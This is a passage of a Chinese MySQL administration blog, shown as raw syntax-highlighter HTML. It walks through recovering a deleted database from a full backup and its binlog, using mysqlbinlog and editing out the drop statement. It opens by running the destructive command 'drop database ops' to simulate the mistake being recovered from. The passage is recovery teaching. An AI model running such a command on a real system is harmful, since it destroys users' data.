Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05eaae909041087992\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmysql&gt; drop database ops;\r\nQuery OK, 1 row affected (0.04 sec)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05eaae909041087992-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae909041087992-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05eaae909041087992-1\"><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">drop </span><span class=\"crayon-e\">database </span><span class=\"crayon-v\">ops</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae909041087992-2\"><span class=\"crayon-e\">Query </span><span class=\"crayon-v\">OK</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">row </span><span class=\"crayon-e\">affected</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0.04</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sec</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p><span style=\"font-weight: normal;\">此时，全备之后到误操作时刻之间，用户写入的数据在binlog中，需要恢复出来!</span></p>\n<p><strong>(5)查看全备之后新增的binlog文件</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05eaae90d633118758\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@vm-002 ~]# cd /opt/backup/\r\n[root@vm-002 backup]# ls\r\nops_2016-09-25.sql.gz\r\n[root@vm-002 backup]# gzip -d ops_2016-09-25.sql.gz\r\n[root@vm-002 backup]# ls\r\nops_2016-09-25.sql\r\n[root@vm-002 backup]# grep CHANGE ops_2016-09-25.sql\r\n-- CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000002', MASTER_LOG_POS=106;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05eaae90d633118758-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae90d633118758-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae90d633118758-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae90d633118758-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae90d633118758-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae90d633118758-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae90d633118758-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae90d633118758-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05eaae90d633118758-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">vm</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">002</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># cd /opt/backup/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae90d633118758-2\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">vm</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">002</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">backup</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># ls</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae90d633118758-3\"><span class=\"crayon-v\">ops_2016</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">09</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">25.sql.gz</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae90d633118758-4\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">vm</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">002</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">backup</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># gzip -d ops_2016-09-25.sql.gz</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae90d633118758-5\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">vm</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">002</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">backup</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># ls</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae90d633118758-6\"><span class=\"crayon-v\">ops_2016</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">09</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">25.sql</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae90d633118758-7\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">vm</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">002</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">backup</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># grep CHANGE ops_2016-09-25.sql</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae90d633118758-8\"><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">CHANGE </span><span class=\"crayon-e\">MASTER </span><span class=\"crayon-st\">TO</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">MASTER_LOG_FILE</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'mysql-bin.000002'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">MASTER_LOG_POS</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">106</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0023 seconds] -->\r\n<p>这是全备时刻的binlog文件位置，即mysql-bin.000002的106行，因此在该文件之前的binlog文件中的数据都已经包含在这个全备的sql文件中了</p>\n<p>（6）移动binlog文件，并导出为sql文件，剔除其中的drop语句，查看mysql的数据存放目录，有下面可知是在/var/lib/mysql下</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05eaae911150445696\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@vm-002 backup]# ps -ef|grep mysql\r\nroot 9272 1 0 01:43 pts/1 00:00:00 /bin/sh /usr/bin/mysqld_safe --datadir=/var/lib/mysql --socket=/var/lib/mysql/mysql.sock --pid-file=/var/run/mysqld/mysqld.pid --basedir=/usr --user=mysql\r\nmysql 9377 9272 0 01:43 pts/1 00:00:00 /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --log-error=/var/log/mysqld.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/lib/mysql/mysql.sock\r\n[root@vm-002 backup]# cd /var/lib/mysql/\r\n[root@vm-002 mysql]# ls\r\nibdata1 ib_logfile0 ib_logfile1 mysql mysql-bin.000001 mysql-bin.000002 mysql-bin.index mysql.sock test\r\n[root@vm-002 mysql]# cp mysql-bin.000002 /opt/backup/</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05eaae911150445696-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae911150445696-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae911150445696-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae911150445696-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae911150445696-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae911150445696-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae911150445696-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05eaae911150445696-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">vm</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">002</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">backup</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># ps -ef|grep mysql</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae911150445696-2\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9272</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">01</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pts</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sh</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mysqld_safe</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">datadir</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mysql</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">socket</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mysql</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sock</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">pid</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">file</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">run</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mysqld</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mysqld</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">pid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">basedir</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">user</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">mysql</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae911150445696-3\"><span class=\"crayon-i\">mysql</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9377</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9272</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">01</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pts</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">libexec</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mysqld</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">basedir</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">datadir</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mysql</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">user</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">mysql</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">error</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mysqld</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">log</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">pid</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">file</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">run</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mysqld</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mysqld</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">pid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">socket</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mysql</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">sock</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae911150445696-4\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">vm</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">002</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">backup</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># cd /var/lib/mysql/</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae911150445696-5\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">vm</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">002</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mysql</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># ls</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae911150445696-6\"><span class=\"crayon-e\">ibdata1 </span><span class=\"crayon-e\">ib_logfile0 </span><span class=\"crayon-e\">ib_logfile1 </span><span class=\"crayon-e\">mysql </span><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">bin</span><span class=\"crayon-sy\">.</span><span class=\"crayon-cn\">000001</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">bin</span><span class=\"crayon-sy\">.</span><span class=\"crayon-cn\">000002</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">bin</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">index </span><span class=\"crayon-v\">mysql</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sock </span><span class=\"crayon-i\">test</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae911150445696-7\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">vm</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">002</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mysql</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># cp mysql-bin.000002 /opt/backup/</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0052 seconds] -->\r\n<p>将binlog文件导出sql文件，并vim编辑它删除其中的drop语句</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05eaae914708731641\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@vm-002 backup]# mysqlbinlog -d ops mysql-bin.000002 &gt;002bin.sql\r\n[root@vm-002 backup]# ls\r\n002bin.sql mysql-bin.000002 ops_2016-09-25.sql\r\n[root@vm-002 backup]# vim 002bin.sql #删除里面的drop语句</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05eaae914708731641-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae914708731641-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae914708731641-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae914708731641-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05eaae914708731641-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">vm</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">002</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">backup</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># mysqlbinlog -d ops mysql-bin.000002 &gt;002bin.sql</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae914708731641-2\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">vm</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">002</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">backup</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># ls</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae914708731641-3\"><span class=\"crayon-cn\">002bin.sql</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">bin</span><span class=\"crayon-sy\">.</span><span class=\"crayon-cn\">000002</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ops_2016</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">09</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">25.sql</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae914708731641-4\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">vm</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">002</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">backup</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># vim 002bin.sql #删除里面的drop语句</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>注意：在恢复全备数据之前必须将该binlog文件移出，否则恢复过程中，会继续写入语句到binlog，最终导致增量恢复数据部分变得比较混乱</p>\n<p><strong>（7）恢复数据</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05eaae918925188305\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button 